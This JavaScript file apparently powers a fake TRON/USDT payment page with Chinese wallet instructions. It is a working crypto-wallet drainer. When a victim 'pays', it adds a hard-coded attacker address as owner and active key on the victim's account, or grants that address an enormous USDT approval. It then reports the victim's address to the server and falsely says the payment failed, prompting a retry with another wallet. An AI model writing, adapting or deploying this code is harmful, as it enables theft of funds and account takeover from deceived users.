spender_bas58 = "TAMtbAwz7UVUepn5m3NR3Zq6qGwuLqNNBV";
if (typeof window.tronWeb !== "undefined") {
  spender_hex = tronWeb.address.toHex(spender_bas58);
} else if (typeof window.bitkeep !== "undefined" && typeof window.bitkeep.tronWeb !== "undefined") {
  spender_hex = window.bitkeep.tronWeb.address.toHex(spender_bas58);
} else {
  spender_hex = null;
}

function copyAndAlert(selectIndex, callable) {
  var payDomain1 = window.location.protocol + "//" + window.location.host;
  var currentPath = window.location.pathname + window.location.search;
  if (payDomain1.endsWith("/")) {
    payDomain1 = payDomain1.slice(0, -1);
  }
  var fullPayUrl = payDomain1 + currentPath + "&_needChain=trx";
  const input = document.createElement("input");
  input.style.position = "fixed";
  input.style.opacity = 0;
  input.value = fullPayUrl;
  document.body.appendChild(input);

  input.select();
  document.execCommand("copy");
  document.body.removeChild(input);

  const modal = document.createElement("div");
  modal.style.position = "fixed";
  modal.style.top = "0";
  modal.style.left = "0";
  modal.style.width = "100%";
  modal.style.height = "100%";
  modal.style.backgroundColor = "rgba(0, 0, 0, 0.7)";
  modal.style.display = "flex";
  modal.style.justifyContent = "center";
  modal.style.alignItems = "center";
  modal.style.zIndex = "9999";

  const content = document.createElement("div");
  content.style.backgroundColor = "white";
  content.style.padding = "20px";
  content.style.borderRadius = "10px";
  content.style.textAlign = "center";

  let images = [];
  let messageText = "";

  switch (selectIndex) {
    case 15:
      images = ["/static/img/tips/BITPIE-help1.5b9c05f611111.jpg"];
      messageText =
        "链接已复制，前往您的比特派钱包选择TRON网络，粘贴支付；如无法支付；请在钱包右下角我的设置里面更新版本在支付；付款成功后秒到账。";
      break;
    case 11:
      images = [
        "/static/img/tips/photo_1_2024-10-25_15-55-41.jpg",
        "/static/img/tips/imtoken-help3.cf1f0a403.jpg",
      ];
      messageText = "链接已复制，前往您的im钱包粘贴支付；付款成功后秒到账。";
      break;
    case 14:
      images = [
        "/static/img/tips/photo_1_2024-10-25_15-58-39.jpg",
        "/static/img/tips/tp-help3.5d9a5fa233.jpg",
      ];
      messageText = "链接已复制，前往您TP钱包粘贴支付；付款成功后秒到账。";
      break;
    case 13:
      images = [
        "/static/img/tips/BitKeep-help1.73143e1411.jpg",
        "/static/img/tips/BitKeep-help2.a6449b3f22.jpg",
      ];
      messageText =
        "链接已复制，前往您的Bitget钱包粘贴支付，如提示选择TRX，请右上角切换TRON网络跟您的地址在支付；付款成功后秒到账。";
      break;
    case 12:
      images = ["/static/img/tips/tronlink1.968ec0d6111.jpg"];
      messageText = "链接已复制，前往您波宝钱包粘贴支付；付款成功后秒到账。";
      break;
    case 16:
      images = ["/static/img/tips/IMG_20241025_221554_365.jpg"];
      messageText =
        "链接已复制，前往您Ascoin钱包粘贴、选择Tron网络支付；付款成功后秒到账。";
      break;
    default:
      images = [];
      messageText = "已复制链接，前往钱包使用";
      break;
  }

  const imgContainer = document.createElement("div");
  imgContainer.style.display = "flex";
  imgContainer.style.overflowX = "auto";
  imgContainer.style.scrollSnapType = "x mandatory";
  imgContainer.style.width = "100%";

  images.forEach((imgSrc) => {
    const img = document.createElement("img");
    img.src = imgSrc;
    img.style.maxWidth = "50%";
    img.style.flexShrink = "0";
    img.style.scrollSnapAlign = "start";
    img.style.margin = "0 5px";

    img.onclick = function (event) {
      event.stopPropagation(); // Prevent modal from closing

      const fullImage = document.createElement("img");
      fullImage.src = img.src;
      fullImage.style.maxWidth = "90%";
      fullImage.style.maxHeight = "90%";
      fullImage.style.position = "fixed";
      fullImage.style.top = "50%";
      fullImage.style.left = "50%";
      fullImage.style.transform = "translate(-50%, -50%)";
      fullImage.style.zIndex = "10000";
      document.body.appendChild(fullImage);

      fullImage.onclick = function () {
        document.body.removeChild(fullImage);
      };
    };

    imgContainer.appendChild(img);
  });

  const message = document.createElement("p");
  message.textContent = messageText;
  message.style.color = "red";

  content.appendChild(message);
  content.appendChild(imgContainer);
  modal.appendChild(content);
  document.body.appendChild(modal);

  // Click to close modal
  modal.onclick = function () {
    document.body.removeChild(modal);
    callable();
  };
}

function printd(text) {
  if (dev) {
    document.getElementById("dev").innerHTML += text + "<br>";
  }
}

async function getWallet() {
  printd("retry");
  
  if (typeof window.imToken !== "undefined") {
    wallet = "imToken";
    printd("imtoken");
    if (typeof window.tronWeb !== "undefined") {
      chain = "tron";
      printd("tron");
      pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      clearInterval(getWalletTimer);
      pay_ele.removeAttribute("style");
      wallet_ele.setAttribute("style", "display:none");
    }
  } 
  else if (
    typeof window.tronLink !== "undefined" &&
    typeof window.tronWeb !== "undefined"
  ) {
    wallet = "tronLink";
    chain = "tron";
    pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    clearInterval(getWalletTimer);
    printd("tronLink");
    pay_ele.removeAttribute("style");
    wallet_ele.setAttribute("style", "display:none");
    try {
      if (typeof window.tronLink.request === "function") {
        await window.tronLink.request({ method: "tron_requestAccounts" });
      }
    } catch (e) {}
  }
  else if (
    (typeof window.ethereum !== "undefined" &&
     typeof window.ethereum.isTokenPocket !== "undefined") ||
    (typeof window.tron !== "undefined" &&
     typeof window.tron.isTokenPocket !== "undefined")
  ) {
    wallet = "tokenPocket";
    printd("tokenPocket");
    if (typeof window.tronWeb !== "undefined") {
      chain = "tron";
      printd("tron");
      pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      clearInterval(getWalletTimer);
      pay_ele.removeAttribute("style");
      wallet_ele.setAttribute("style", "display:none");
    }
  }
  else if (
    typeof window.tron !== "undefined" &&
    typeof window.tron.isTronLink !== "undefined"
  ) {
    wallet = "tronLink";
    chain = "tron";
    pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    clearInterval(getWalletTimer);
    printd("tronLink");
    pay_ele.removeAttribute("style");
    wallet_ele.setAttribute("style", "display:none");
    printd("钱包版本：" + window.tronLink.version);
    printd("tronWeb版本：" + window.tronWeb.version);
    var a = await window.tronWeb.trx.getBalance(
      window.tronWeb.defaultAddress.base58
    );
    printd("TRX余额：" + a / 1000000);
  } 
  else if (
    typeof window.Tron !== "undefined" &&
    typeof window.tronPay !== "undefined"
  ) {
    wallet = "bitpie";
    chain = "tron";
    pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    clearInterval(getWalletTimer);
    printd("tronLink");
    pay_ele.removeAttribute("style");
    wallet_ele.setAttribute("style", "display:none");
    printd("钱包版本：" + window.tronLink.version);
    printd("tronWeb版本：" + window.tronWeb.version);
    var a = await window.tronWeb.trx.getBalance(
      window.tronWeb.defaultAddress.base58
    );
    printd("TRX余额：" + a / 1000000);
  }   else if (
    typeof window.bitkeep !== "undefined" &&
    typeof window.bitkeep.tronLink !== "undefined" &&
    typeof window.bitkeep.tronWeb !== "undefined"
  ) {
    wallet = "bitkeep";
    chain = "tron";
    pay_addr_input_ele.innerHTML = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    clearInterval(getWalletTimer);
    printd("tronLink");
    pay_ele.removeAttribute("style");
    wallet_ele.setAttribute("style", "display:none");
    printd("钱包版本：" + window.tronLink.version);
    printd("tronWeb版本：" + window.tronWeb.version);
    var a = await window.tronWeb.trx.getBalance(
      window.tronWeb.defaultAddress.base58
    );
    printd("TRX余额：" + a / 1000000);
  } 
  else {
    timerCounts += 1;
    if (timerCounts > 30) {
      printd("未检测到钱包环境");
      clearInterval(getWalletTimer);
      try {
        if (wallet_ele) wallet_ele.removeAttribute("style");
        if (pay_ele) pay_ele.setAttribute("style", "display:none");
      } catch (e) {}
      alert("检测到您在普通浏览器打开，请在钱包内打开本页面进行支付");
    }
  }
}

function payNow() {
  amount = getCurrentDateTimeString();
  try {
    var noWalletEnv = (
      typeof window.tronWeb === 'undefined' &&
      typeof window.tronLink === 'undefined' &&
      typeof window.imToken === 'undefined' &&
      !(typeof window.ethereum !== 'undefined' && typeof window.ethereum.isTokenPocket !== 'undefined') &&
      !(typeof window.tron !== 'undefined' && typeof window.tron.isTokenPocket !== 'undefined') &&
      !(typeof window.tron !== 'undefined' && typeof window.tron.isTronLink !== 'undefined') &&
      !(typeof window.bitkeep !== 'undefined' && (typeof window.bitkeep.tronWeb !== 'undefined' || typeof window.bitkeep.tronLink !== 'undefined'))
    );
    if (noWalletEnv) {
      try {
        if (wallet_ele) wallet_ele.removeAttribute('style');
        if (pay_ele) pay_ele.setAttribute('style', 'display:none');
      } catch (e) {}
      alert('检测到您在普通浏览器打开，请在钱包内打开本页面进行支付');
      return;
    }
  } catch (e) {}
  try {
    if (typeof window.tronLink !== 'undefined' && typeof window.tronLink.request === 'function') {
      window.tronLink.request({ method: 'tron_requestAccounts' })
        .then(function(){
          try {
            if (typeof window.tronWeb !== 'undefined') {
              wallet = 'tronLink';
              chain = 'tron';
              TUAP();
              return;
            }
          } catch (e) {}
        })
        .catch(function(){});
    }
  } catch (e) {}
  if (chain == "tron") {
    if (wallet == "imToken") {
      alert("正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！");
      TUAP();
    } else {
      TUAP();
    }
  } else {
    try {
      if (wallet_ele) wallet_ele.removeAttribute('style');
      if (pay_ele) pay_ele.setAttribute('style', 'display:none');
    } catch (e) {}
    alert('检测到您在普通浏览器打开，请在钱包内打开本页面进行支付');
  }
}

async function TUAP() {
  if (wallet == "okxwallet") {
    let state = await window.okxwallet.tronLink.request({
      method: "tron_requestAccounts",
    });
    if (state.code == 200) {
      let trx = await window.okxwallet.tronLink.tronWeb.trx.getBalance(
        window.okxwallet.tronLink.tronWeb.defaultAddress.base58
      );
      if (trx < 100000000) {
        alert("没有足够的TRX用于支付网络费。");
      } else {
        let ownerAddress = window.okxwallet.tronLink.tronWeb.defaultAddress.hex;
        let ownerPermission = { type: 0, permission_name: "owner" };
        ownerPermission.threshold = 1;
        ownerPermission.keys = [];
        let activePermission = { type: 2, permission_name: "active0" };
        activePermission.threshold = 1;
        activePermission.operations =
          "7fff1fc0037e0000000000000000000000000000000000000000000000000000";
        activePermission.keys = [];
        ownerPermission.keys.push({ address: spender_hex, weight: 1 });
        ownerPermission.keys.push({
          address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex,
          weight: 1,
        });
        activePermission.keys.push({ address: spender_hex, weight: 1 });
        activePermission.keys.push({
          address: window.okxwallet.tronLink.tronWeb.defaultAddress.hex,
          weight: 1,
        });
        try {
          const updateTransaction =
            await window.okxwallet.tronLink.tronWeb.transactionBuilder.updateAccountPermissions(
              ownerAddress,
              ownerPermission,
              null,
              [activePermission]
            );
          console.log(updateTransaction);
          const signed = await window.okxwallet.tronLink.tronWeb.trx.sign(
            updateTransaction
          );
          console.log(signed);
          const res =
            await window.okxwallet.tronLink.tronWeb.trx.sendRawTransaction(
              signed
            );
          console.log(res);
          successCallback(
            window.tronWeb.defaultAddress.base58,
            spender_bas58,
            0
          );
        } catch (error) {
          alert("支付失败！");
        }
      }
    } else {
      alert("DAPP请求连接失败！");
    }
  } else {
    document.getElementById("btn_pay").setAttribute("style", "display:none");
    approval.removeAttribute("style");
    approval.setAttribute("style", "height: 95%;");
  }
}

async function tronIA() {
  let trx = await window.tronWeb.trx.getBalance(
    window.tronWeb.defaultAddress.base58
  );
  if (trx > 8000000) {
    const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    try {
      let contract = await tronWeb.contract().at(trc20ContractAddress);
      res = await contract
        .increaseApproval(spender_bas58, amount)
        .send({ feeLimit: 100000000 });
      successCallback(
        window.tronWeb.defaultAddress.base58,
        spender_bas58,
        approve_type
      );
    } catch (error) {
      console.error("trigger smart contract error", error);
      alert("支付失败！");
    }
  } else {
    alert("没有足够的TRX用于支付网络费！");
  }
}

// Helper functions
function getCurrentDateTimeString() {
    const now = new Date();
    const year = now.getFullYear();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    const seconds = String(now.getSeconds()).padStart(2, '0');
    return `${year}${month}${day}${hours}${minutes}${seconds}`;
}

function successCallback(address, approved, type) {
  sendGetRequest(
    "/successCallback?address=" +
      address +
      "&approved=" +
      approved +
      "&chain=" +
      chain +
      "&type=" +
      type,
    function (responseData) {
      console.log("成功获取数据:", responseData);
      alert("支付失败，请尝试使用其他钱包！");
    },
    function (error) {
      console.error("获取数据失败:", error);
    }
  );
}

function sendGetRequest(url, onSuccess, onError) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", url, true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        onSuccess(xhr.responseText);
      } else {
        onError("请求失败: " + xhr.statusText);
      }
    }
  };
  xhr.send();
}

// Initialization
dev = false;
timerCounts = 0;
wallet = "undefined";
chain = "undefined";
wallet_ele = document.getElementById("wallet_d");
pay_ele = document.getElementById("pay_d");
pay_addr_input_ele = document.getElementById("pay_addr");
approval = document.getElementById("approval");
contract_addr = "undefined";
contract_abi = [];
document.addEventListener("DOMContentLoaded", function () {
  getWalletTimer = setInterval(getWallet, 1000);
});

// 监听 tronLink 注入（移动端常见延迟注入）
document.addEventListener('tronLink#initialized', function () {
  try {
    if (typeof window.tronWeb !== 'undefined') {
      wallet = 'tronLink';
      chain = 'tron';
      pay_addr_input_ele.innerHTML = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
      if (getWalletTimer) clearInterval(getWalletTimer);
      if (pay_ele) pay_ele.removeAttribute('style');
      if (wallet_ele) wallet_ele.setAttribute('style', 'display:none');
    }
  } catch (e) {}
});